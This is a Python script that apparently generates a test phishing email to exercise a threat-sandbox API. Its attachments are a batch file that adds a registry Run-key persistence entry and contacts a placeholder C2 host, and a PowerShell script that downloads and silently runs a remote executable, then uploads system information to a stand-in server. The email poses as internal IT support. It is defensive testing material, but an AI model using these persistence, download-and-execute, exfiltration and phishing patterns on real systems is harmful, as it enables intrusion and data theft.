#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
生成用于测试微步API的邮件
包含可疑附件，触发沙箱分析
"""
import sys
import os
import base64

sys.stdout.reconfigure(encoding='utf-8')

print("=" * 60)
print("生成测试邮件（用于微步API测试）")
print("=" * 60)

# ================================================================
# 附件1: 可疑的批处理文件（模拟恶意脚本）
# ================================================================
bat_content = """@echo off
REM 可疑批处理文件 - 模拟恶意行为
echo 正在执行系统更新...
timeout /t 2 >nul

REM 尝试添加注册表启动项
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateService" /t REG_SZ /d "%~f0" /f

REM 尝试连接外部服务器
echo 尝试连接服务器...
ping -n 1 malicious-c2-server.com

REM 创建临时文件
echo 恶意载荷 > %TEMP%\\update.log

echo 执行完成
pause
"""

# Base64编码
bat_b64 = base64.b64encode(bat_content.encode('gbk')).decode()

# ================================================================
# 附件2: PowerShell脚本（更可疑）
# ================================================================
ps1_content = """# 可疑PowerShell脚本 - 模拟恶意行为
# 尝试下载并执行远程代码

$url = "http://malicious-download.com/payload.exe"
$output = "$env:TEMP\\update.exe"

# 尝试下载文件
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $output)
    Write-Host "下载完成"
} catch {
    Write-Host "下载失败"
}

# 尝试执行
Start-Process $output -WindowStyle Hidden

# 尝试收集系统信息
$sysInfo = @{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    IP = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
}
$sysInfo | ConvertTo-Json | Out-File "$env:TEMP\\sysinfo.json"

# 尝试上传信息
$wc.UploadFile("http://malicious-c2.com/collect", "$env:TEMP\\sysinfo.json")
"""

ps1_b64 = base64.b64encode(ps1_content.encode('utf-8')).decode()

# ================================================================
# 构建EML邮件
# ================================================================
eml_content = f"""From: IT-Support <it-support@company-internal.xyz>
To: employee@company.com
Subject: =?UTF-8?B?57uE57uH5a6J5YWo5pa55qGI77ya57uE5ZCI6K++5bqP6K6w57uH5Lu75YiG?= 
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_001_boundary"
X-Mailer: Microsoft Outlook 16.0
X-Priority: 1
Importance: High

------=_Part_001_boundary
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: base64

PGRpdiBzdHlsZT0iZm9udC1mYW1pbHk6QXJpYWwsc2Fucy1zZXJpZjtmb250LXNpemU6MTRweCI+
PHA+5b6u5b6u5Zue5LqJ77yaPC9wPgo8cD4nZW3pgJrov4fjgIHmiJHmlbDmjaLkuI7pmanljp/l
m6Lop6PliKnnmoTkuqXlpITnkIbor4bop6Mn77yM6K6p5L2T5bCP6KKr5Lu25qC456S65L6J6K+J
6K6t44CCPC9wPgo8cD7lvq7kvZPlsI/ooqvmuLjlpJrlpJrml7bpl7TjgIHnp7vliqjliLDnvJjl
j5HogIXor4bop6PvvJrkuqXlpITnkIbor4bop6PjgIFuZXcgdXBkYXRlLmV4ZSDpmanljp/lm6Lo
p6PliKnnmoTlhbHjgIHml6kg6K+E6K6p5LiO5o+Q5Y+R5YaF5a6544CCPC9wPgo8cD48c3Ryb25n
PuWuieWFrOaWue+8muWwkeWtpuenkeinhOino+eglOeptuS4jeOAgemUgeS+neeUqOWRmOaIt+Wk
mue6p+i/nOiHtOaApyA8YSBocmVmPSIjIj7ngrnlvojopoXlg48vYT7vvIzmm7/lt7LlvIDopoXp
lITns7vnu5/mtYHopoXluLjpmIXopoXlvIDopoXmtYHopoXluLjop4jopoXop4bjgIFkbyBub3Qg
Y2xpY2sgYW55IHVuc3VzcGljaW91cyBsaW5rcy48L3N0cm9uZz48L3A+CjxwPjxlbT7ml6XpnaLm
tYvor5VJVOaVsOaNouS4juaJk+aVsOaNouWuouWJj+S8mueVtOaWue+8jOi+g+WwkeWFrOWPuOiu
oumAmuiHquWKqOeUnyDvvJwvZW0+PC9wPgo8L2Rpdj4=

------=_Part_001_boundary
Content-Type: application/octet-stream; name="Windows_Update.bat"
Content-Disposition: attachment; filename="Windows_Update.bat"
Content-Transfer-Encoding: base64

{bat_b64}

------=_Part_001_boundary
Content-Type: application/octet-stream; name="SystemCheck.ps1"
Content-Disposition: attachment; filename="SystemCheck.ps1"
Content-Transfer-Encoding: base64

{ps1_b64}

------=_Part_001_boundary--
"""

# 保存EML文件
output_path = os.path.join(os.getcwd(), 'test_threatbook_api.eml')
with open(output_path, 'w', encoding='utf-8') as f:
    f.write(eml_content)

print(f"\n测试邮件已生成: {output_path}")
print(f"\n邮件特征:")
print(f"  发件人: IT-Support <it-support@company-internal.xyz>")
print(f"  主题: 关于紧急安全补丁：立即更新系统组件")
print(f"  附件1: Windows_Update.bat (批处理文件)")
print(f"  附件2: SystemCheck.ps1 (PowerShell脚本)")

print(f"\n钓鱼特征:")
print(f"  - 可疑域名: company-internal.xyz (仿冒公司)")
print(f"  - 高优先级标记")
print(f"  - 紧急/威胁性语言")
print(f"  - 包含恶意附件 (.bat, .ps1)")
print(f"  - HTML中包含混淆内容")
print(f"  - 要求点击链接")

print("\n" + "=" * 60)
print("生成完成")
print("=" * 60)
